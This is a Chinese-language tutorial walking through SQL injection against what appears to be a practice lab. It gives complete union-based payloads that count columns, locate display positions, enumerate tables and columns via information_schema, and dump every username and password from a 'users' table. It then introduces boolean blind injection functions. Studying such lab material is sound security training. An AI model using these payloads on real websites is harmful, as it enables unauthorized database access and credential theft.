当我输入 ?id =1的时候有正常回显

报错(POC)

而?id=1' 时候，会明显报错，结合我们准备工作，我们可以明显的看到，本该正常闭合的单引号，却多出来了一个单引号，导致无法正常闭合

注意 有报错就说明，我们可以进行操作,进行注入

之后我们使用联合查询进行注入，大家都学过 ∪，A∪B，当A为假的时候，就会执行B，那么，我让前面的id=-1,一般设置id，都不会设置为负数，那么前面的条件就绝对是假的，我们后面构造我们想要的条件，就ok了

判断列数

报错以后，后面的单引号，我们需要用注释符注释掉，注释符*#*不生效,所以我们选择 **–+**让他后面的单引号不生效，从而打破他原来的闭合

order by 是为了判断列数，为后面的回显位做铺垫

?id=1' order by 数字 --+ ，数字从 1，2，3，往后一个一个试

直到报错，不回显，那么报错的前一位,就是列数，比如 order 4 不回显，那么 4就是不存在的，存在的只能是 3

爆破回显位

这里可以看出 有name和password两个回显位，因此，我们用联合查询，1，2，3，试一下 (他之前一定要为假,把 id= -1)

可以看到，虽然是有三列，但是只爆破了后两列，这涉及到数据库的主键等内容，有兴趣的可以了解一下

?id=-1' union select 1,2,3 --+

之后我们在2，3位置就可以进行爆破

爆破信息(套路固定)

可以看到，数据库是 security

?id=-1' union select 1,database(),3 --+

之后完整的流程是这样子

查表名

?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = database() --+

查列名(table_name是上面查出来的)

?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name = 'users' --+

这个表里，有名字和密码，我们把他们提取出来

?id=-1' union select 1,2,group_concat(concat_ws('~',username,password)) from security.users--+

这样，第一关就算完成了

第五关开始属于 盲注 ，不会暴露回显位，但如何查到的东西正确，那么它将回显 you are in这么一段话

这里介绍一下布尔盲注的解法

知识补充

  • left( string, n) string为要截取的字符串，n为长度（right函数为自后向前截取）
  • substr(string, start, length) string为要截取的字符串，start为起始位置（起始值为1），length为长度（substring用法同substr）
  • mid(string, start, length) 同substring
  • ascii（str）返回字符串最左边一位的ASCII码值
  • ord（str）返回字符串第一位的ASCII码值
  • 正则函数 regexp
  • like函数 类似上面的regexp，也可以进行模糊索引，一样不区分大小写

​ select user() like 'roa%';
